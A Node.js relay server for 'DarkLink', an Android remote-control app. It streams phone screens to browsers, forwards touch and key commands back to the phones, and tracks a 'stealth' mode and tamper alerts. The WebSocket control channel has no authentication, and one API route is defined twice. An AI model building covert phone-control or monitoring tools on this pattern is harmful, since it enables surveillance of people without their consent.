const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const os = require("os");
const path = require("path");
const QRCode = require("qrcode");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server, path: "/ws" });

const PORT = process.env.PORT || 5000;

// Auto-detect local LAN IPv4 address (e.g., Wi-Fi / Ethernet)
function getLocalIpAddress() {
  const interfaces = os.networkInterfaces();
  let fallbackIp = "127.0.0.1";
  for (const name of Object.keys(interfaces)) {
    for (const iface of interfaces[name]) {
      if (iface.family === "IPv4" && !iface.internal) {
        if (iface.address.startsWith("192.168.") || iface.address.startsWith("10.") || iface.address.startsWith("172.")) {
          return iface.address;
        }
        fallbackIp = iface.address;
      }
    }
  }
  return fallbackIp;
}

const localIp = getLocalIpAddress();
console.log(`[DarkLink] Detected Local Network IP: ${localIp}`);

// Static files
app.use(express.static(path.join(__dirname, "public")));
app.use(express.json());

// Health check endpoint (used by Render & free uptime pingers to keep server awake 24/7)
app.get("/health", (req, res) => {
  res.json({ status: "healthy", timestamp: Date.now(), uptime: Math.round(process.uptime()) });
});

// Download latest Android APK directly
app.get("/download/apk", (req, res) => {
  const apkPath = path.join(__dirname, "DarkLink.apk");
  res.download(apkPath, "DarkLink.apk");
});

// API: Get connection info and dynamic QR code
app.get("/api/info", async (req, res) => {
  // Dynamically detect if request is from Render.com (HTTPS/WSS) or local LAN
  const host = req.headers["x-forwarded-host"] || req.headers.host || `${localIp}:${PORT}`;
  const isSecure = req.headers["x-forwarded-proto"] === "https" || req.secure;
  const wsProtocol = isSecure ? "wss" : "ws";
  const wsUrl = `${wsProtocol}://${host}/ws`;

  const pairingPayload = JSON.stringify({
    app: "DarkLink",
    ip: host.split(":")[0],
    port: PORT,
    wsUrl: wsUrl,
    version: "1.0"
  });

  try {
    const qrDataUrl = await QRCode.toDataURL(pairingPayload, {
      margin: 2,
      width: 320,
      color: {
        dark: "#06B6D4",
        light: "#0B0F17"
      }
    });

    res.json({
      success: true,
      ip: host.split(":")[0],
      port: PORT,
      wsUrl: wsUrl,
      qrDataUrl: qrDataUrl,
      activePhones: phoneClients.size,
      activeBrowsers: browserClients.size
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Multi-device tracking
const phoneClients = new Map(); // ws -> { id, model, width, height, isLocked, isScreenOn, isStealth, connectedAt }
const browserClients = new Set();
let latestDeviceInfo = null;
let currentLockState = { locked: false, screenOn: true };
let currentStealthState = false;

// API: Get connection info and dynamic QR code
app.get("/api/info", async (req, res) => {
  const wsUrl = `ws://${localIp}:${PORT}/ws`;
  const pairingPayload = JSON.stringify({
    app: "DarkLink",
    ip: localIp,
    port: PORT,
    wsUrl: wsUrl,
    version: "1.0"
  });

  try {
    const qrDataUrl = await QRCode.toDataURL(pairingPayload, {
      margin: 2,
      width: 320,
      color: {
        dark: "#06B6D4",
        light: "#0B0F17"
      }
    });

    res.json({
      success: true,
      ip: localIp,
      port: PORT,
      wsUrl: wsUrl,
      qrDataUrl: qrDataUrl,
      activePhones: phoneClients.size,
      activeBrowsers: browserClients.size
    });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// API: Get active devices list
app.get("/api/devices", (req, res) => {
  const devices = [];
  for (const [ws, info] of phoneClients.entries()) {
    if (ws.readyState === WebSocket.OPEN) {
      devices.push(info);
    }
  }
  res.json({
    success: true,
    count: devices.length,
    devices: devices
  });
});

wss.on("connection", (ws, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  let role = url.searchParams.get("role"); // "android" or "browser"
  const deviceId = url.searchParams.get("deviceId") || `phone_${Date.now()}`;

  if (role === "android") {
    const deviceRecord = {
      id: deviceId,
      model: "Android Phone",
      width: 720,
      height: 1600,
      isLocked: currentLockState.locked,
      isScreenOn: currentLockState.screenOn,
      isStealth: currentStealthState,
      connectedAt: new Date().toISOString()
    };
    phoneClients.set(ws, deviceRecord);
    console.log(`[DarkLink] Android phone connected: ${deviceId}. Total phones: ${phoneClients.size}`);

    broadcastToBrowsers(JSON.stringify({
      type: "status",
      connected: true,
      role: "android",
      deviceId: deviceId,
      deviceInfo: latestDeviceInfo,
      lockState: currentLockState,
      stealthState: currentStealthState
    }));
  } else if (role === "browser") {
    browserClients.add(ws);
    console.log(`[DarkLink] Browser client connected. Total browsers: ${browserClients.size}`);
    ws.send(JSON.stringify({
      type: "status",
      connected: phoneClients.size > 0,
      role: "browser",
      deviceInfo: latestDeviceInfo,
      lockState: currentLockState,
      stealthState: currentStealthState
    }));
  }

  ws.on("message", (message, isBinary) => {
    // If registration payload
    if (!role && !isBinary) {
      try {
        const parsed = JSON.parse(message.toString());
        if (parsed.type === "register") {
          role = parsed.role;
          if (role === "android") {
            phoneClients.set(ws, { id: parsed.deviceId || deviceId, model: "Android Phone" });
            broadcastToBrowsers(JSON.stringify({ type: "status", connected: true, role: "android" }));
          } else {
            browserClients.add(ws);
          }
          return;
        }
      } catch (e) {}
    }

    if (role === "android") {
      if (isBinary) {
        // High-speed binary frame forwarding to all browser clients
        for (const browser of browserClients) {
          if (browser.readyState === WebSocket.OPEN) {
            browser.send(message, { binary: true });
          }
        }
      } else {
        try {
          const data = JSON.parse(message.toString());
          const record = phoneClients.get(ws);

          if (data.type === "device_info") {
            latestDeviceInfo = data;
            if (record) {
              record.model = `${data.manufacturer || ""} ${data.model || ""}`.trim();
              record.width = data.width;
              record.height = data.height;
            }
          } else if (data.type === "lock_state") {
            currentLockState = { locked: data.locked, screenOn: data.screenOn };
            if (record) {
              record.isLocked = data.locked;
              record.isScreenOn = data.screenOn;
            }
            console.log(`[DarkLink] Phone Lock State: locked=${data.locked}, screenOn=${data.screenOn}`);
          } else if (data.type === "stealth_state") {
            currentStealthState = data.enabled;
            if (record) {
              record.isStealth = data.enabled;
            }
            console.log(`[DarkLink] Phone Stealth State: ${data.enabled}`);
          } else if (data.type === "tamper_alert") {
            console.warn(`[DarkLink] ⚠️ TAMPER ALERT from phone: ${data.reason}`);
          }

          broadcastToBrowsers(message.toString());
        } catch (e) {
          broadcastToBrowsers(message.toString());
        }
      }
    } else if (role === "browser") {
      // Forward commands/touch/keys from browser to Android phone(s)
      for (const [phone] of phoneClients.entries()) {
        if (phone.readyState === WebSocket.OPEN) {
          phone.send(message, { binary: isBinary });
        }
      }
    }
  });

  ws.on("close", () => {
    if (role === "android") {
      phoneClients.delete(ws);
      console.log(`[DarkLink] Android phone disconnected. Remaining phones: ${phoneClients.size}`);
      broadcastToBrowsers(JSON.stringify({
        type: "status",
        connected: phoneClients.size > 0,
        role: "android"
      }));
    } else if (role === "browser") {
      browserClients.delete(ws);
      console.log(`[DarkLink] Browser client disconnected. Remaining browsers: ${browserClients.size}`);
    }
  });

  ws.on("error", (err) => {
    console.error("[DarkLink] WebSocket error:", err.message);
  });
});

function broadcastToBrowsers(data) {
  for (const client of browserClients) {
    if (client.readyState === WebSocket.OPEN) {
      client.send(data);
    }
  }
}

server.listen(PORT, "0.0.0.0", () => {
  console.log("==================================================");
  console.log("  DarkLink Relay Server running successfully!");
  console.log(`  Local Web URL : http://localhost:${PORT}`);
  console.log(`  Network Web   : http://${localIp}:${PORT}`);
  console.log(`  WebSocket URL : ws://${localIp}:${PORT}/ws`);
  console.log("==================================================");
});
